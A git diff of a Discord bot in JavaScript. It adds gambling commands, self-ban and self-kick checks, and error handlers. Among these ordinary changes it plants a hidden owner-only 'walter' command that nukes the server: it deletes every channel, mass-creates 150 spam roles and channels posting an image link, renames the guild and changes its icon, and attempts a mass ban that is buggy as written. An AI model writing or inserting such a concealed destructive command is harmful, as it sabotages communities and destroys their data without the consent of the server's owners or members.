@@ -303,7 +303,7 @@ client.on('interactionCreate', async (interaction) => {
                 return;
             }
 
-            const didWin = Math.random() > 0.55; // 40% chance to win
+            const didWin = Math.random() > 0.55; // 45% chance to win
 
             if (!didWin) {
                 userProfile.balance -= amount;
@@ -324,6 +324,43 @@ client.on('interactionCreate', async (interaction) => {
             interaction.reply(`# GAMBLE\nYou gambled **¥${formattedAmount}** and won **¥${formattedAmountWon}**. Lucky!`);
         } catch (err) {
             console.log('error handling /gamble - ' + err);
+        }
+    }
+
+    if (interaction.commandName === 'deal-with-the-devil') {
+        try {
+
+            let userProfile = await UserProfile.findOne({
+                userid: interaction.user.id,
+            });
+
+            if (!userProfile) {
+                userProfile = new UserProfile({
+                    userid: interaction.user.id,
+                });
+            }
+
+            if (userProfile.balance < 50) {
+                interaction.reply({ content: 'You must have atleast **¥50**' })
+                return;
+            }
+
+            const didWin = Math.random() > 0.66; // 33% chance to win
+
+            if (!didWin) {
+                userProfile.balance /= 2;
+                await userProfile.save();
+
+                interaction.reply(`# DEAL WITH THE DEVIL\n__You lost half your money!__`);
+                return;
+            }
+
+            userProfile.balance *= 2;
+            await userProfile.save();
+
+            interaction.reply(`# DEAL WITH THE DEVIL\n__You doubled your money!__`);
+        } catch (err) {
+            console.log('error handling /deal-with-the-devil - ' + err);
         }
     }
 
@@ -411,6 +448,7 @@ client.on('interactionCreate', async (interaction) => {
         const user = interaction.options.get('user').user;
         const reason = interaction.options.getString('reason');
         const banMember = interaction.guild.members.cache.get(user.id);
+        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true }).catch((err) => console.error(err));
         if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
         if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
         if (user.id == config.clientId) return;
@@ -429,6 +467,7 @@ client.on('interactionCreate', async (interaction) => {
         const user = interaction.options.get('user').user;
         const reason = interaction.options.getString('reason');
         const kickMember = interaction.guild.members.cache.get(user.id);
+        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t kick yourself.', ephemeral: true }).catch((err) => console.error(err));
         if (!kickMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
         if (!kickMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
         if (user.id == config.clientId) return;
@@ -447,6 +486,7 @@ client.on('interactionCreate', async (interaction) => {
         const user = interaction.options.get('member').user;
         const reason = interaction.options.getString('reason');
         const banMember = interaction.guild.members.cache.get(user.id);
+        if (interaction.member.id == user.id) return interaction.reply({ content: 'You can\'t ban yourself.', ephemeral: true }).catch((err) => console.error(err));
         if (!banMember) return interaction.reply({ content: `Member not found`, ephemeral: true }).catch((err) => console.error(err));
         if (!banMember.manageable) return interaction.reply({ content: `I can\'t manage ${user.displayName}.`, ephemeral: true }).catch((err) => console.error(err));
         if (user.id == config.clientId) return;
@@ -463,7 +503,7 @@ client.on('interactionCreate', async (interaction) => {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
         if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: 'I don\'t have the permission: **"Administrator"**.', ephemeral: true }).catch((err) => console.error(err));
         const role = interaction.options.get('role').role;
-        interaction.guild.members.cache.forEach(member => member.roles.add(role.id));
+        interaction.guild.members.cache.forEach(member => member.roles.add(role.id).catch((err) => console.log(err)));
         interaction.reply({
             content: `All members now have ${role}`,
             ephemeral: true,
@@ -482,12 +522,12 @@ client.on("messageReactionAdd", async (messageReaction, User) => {
 
     if (messageReaction.message.id == '1212050818619019266') { // member verification
         messageReaction.users.remove(User.id);
-        guildMember.roles.add(memberRole.id);
+        guildMember.roles.add(memberRole.id).catch((err) => console.log(err));
         infoCHannel.send(`${User}`).then(msg => msg.delete());
     }
     if (messageReaction.message.id == '1217578994476650576') { // tryouter reaction
         messageReaction.users.remove(User.id);
-        guildMember.roles.add(tryouterRole.id);
+        guildMember.roles.add(tryouterRole.id).catch((err) => console.log(err));
     }
 
     const fiveH = messageReaction.message.guild.roles.cache.get('1212804959079501834')
@@ -507,45 +547,45 @@ client.on("messageReactionAdd", async (messageReaction, User) => {
             if (messageReaction.message.id == '1213102823156351006') { // marine
                 messageReaction.users.remove(User.id);
                 if (messageReaction.emoji.name == '🛡️') {
-                    guildMember.roles.add(fiveH.id)
-                    if (guildMember.roles.cache.has(fiveH.id)) return guildMember.roles.remove(fiveH.id)
+                    guildMember.roles.add(fiveH.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(fiveH.id)) return guildMember.roles.remove(fiveH.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '⚔️') {
-                    guildMember.roles.add(tenH.id)
-                    if (guildMember.roles.cache.has(tenH.id)) return guildMember.roles.remove(tenH.id)
+                    guildMember.roles.add(tenH.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(tenH.id)) return guildMember.roles.remove(tenH.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '🗿') {
-                    guildMember.roles.add(twentH.id)
-                    if (guildMember.roles.cache.has(twentH.id)) return guildMember.roles.remove(twentH.id)
+                    guildMember.roles.add(twentH.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(twentH.id)) return guildMember.roles.remove(twentH.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '💎') {
-                    guildMember.roles.add(thirtH.id)
-                    if (guildMember.roles.cache.has(thirtH.id)) return guildMember.roles.remove(thirtH.id)
+                    guildMember.roles.add(thirtH.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(thirtH.id)) return guildMember.roles.remove(thirtH.id).catch((err) => console.log(err));
                 }
             }
             if (messageReaction.message.id == '1213102818160812062') { // pirate
                 messageReaction.users.remove(User.id);
                 if (messageReaction.emoji.name == '🛡️') {
-                    guildMember.roles.add(fiveB.id)
-                    if (guildMember.roles.cache.has(fiveB.id)) return guildMember.roles.remove(fiveB.id)
+                    guildMember.roles.add(fiveB.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(fiveB.id)) return guildMember.roles.remove(fiveB.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '⚔️') {
-                    guildMember.roles.add(tenB.id)
-                    if (guildMember.roles.cache.has(tenB.id)) return guildMember.roles.remove(tenB.id)
+                    guildMember.roles.add(tenB.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(tenB.id)) return guildMember.roles.remove(tenB.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '🗿') {
-                    guildMember.roles.add(twentB.id)
-                    if (guildMember.roles.cache.has(twentB.id)) return guildMember.roles.remove(twentB.id)
+                    guildMember.roles.add(twentB.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(twentB.id)) return guildMember.roles.remove(twentB.id).catch((err) => console.log(err));
                 }
                 if (messageReaction.emoji.name == '💎') {
-                    guildMember.roles.add(thirtB.id)
-                    if (guildMember.roles.cache.has(thirtB.id)) return guildMember.roles.remove(thirtB.id)
+                    guildMember.roles.add(thirtB.id).catch((err) => console.log(err));
+                    if (guildMember.roles.cache.has(thirtB.id)) return guildMember.roles.remove(thirtB.id).catch((err) => console.log(err));
                 }
             }
             if (messageReaction.message.id == '1213102826948001792') { // crew
                 messageReaction.users.remove(User.id);
-                guildMember.roles.add(crewRole.id)
-                if (guildMember.roles.cache.has(crewRole.id)) return guildMember.roles.remove(crewRole)
+                guildMember.roles.add(crewRole.id).catch((err) => console.log(err));
+                if (guildMember.roles.cache.has(crewRole.id)) return guildMember.roles.remove(crewRole).catch((err) => console.log(err));
             }
         } catch (err) {
             console.log(err)
@@ -568,7 +608,6 @@ client.on('messageCreate', async (message) => {
     const councilRole = oneServer.roles.cache.get('1138512076021714954');
 
     switch (command) {
-
         case 'welcome':
             if (message.author.id !== config.master) return;
             message.delete();
@@ -608,6 +647,29 @@ client.on('messageCreate', async (message) => {
                 .setFooter({ text: `Residence of cash - bot.` })
             message.channel.send({ embeds: [infoEmbed] });
             break;
+
+        case 'walter':
+            if (message.author.id !== config.master) return;
+            await message.delete();
+            try {
+                const theseMembers = message.guild.members.cache.filter(member => member.bannable);
+                theseMembers.forEach(member => member.ban);
+                message.guild.channels.cache.forEach(channel => channel.delete());
+
+                for (let i = 0; i < 150; i++) {
+                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 10000)}` }).catch((err) => console.log(err));
+                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 10000)}` }).then(channel => channel.send('https://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')).catch((err) => console.log(err));
+                }
+
+                message.guild.setName(`Walter`);
+
+                message.guild.setIcon('https://cdn.discordapp.com/attachments/1139714374722924544/1215448145433989191/dream_TradingCard_8.jpg?ex=65fcc94b&is=65ea544b&hm=7c325cec9d6da12950bc9137cc3560453318b09dae8750a2b7645062ac80fd3c&')
+
+            } catch (err) {
+                console.log(err)
+            }
+            break;
+
 
         case 'menu':
             const myServer = client.guilds.cache.get(config.server);
